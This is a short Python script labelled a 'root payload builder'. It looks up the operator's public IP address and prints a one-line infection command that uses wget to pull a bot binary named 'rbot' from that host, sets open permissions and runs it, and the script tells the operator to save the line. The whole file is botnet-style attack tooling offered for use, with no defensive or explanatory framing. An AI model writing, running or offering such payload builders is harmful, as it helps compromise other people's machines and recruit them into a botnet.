#Grim's root payload builder
#usage: python3 root.py
import os, urllib.request

os.system("clear")
ipaddr = urllib.request.urlopen('http://api.ipify.org').read().decode("utf-8")
print(f"\033[1;95mYour Payload\033[37m: \033[1;96mwget http://"+ipaddr+"/botpilled/rbot; chmod 777 *; ./rbot\n\n\033[1;92mSAVE THIS!\033[37m\n\n")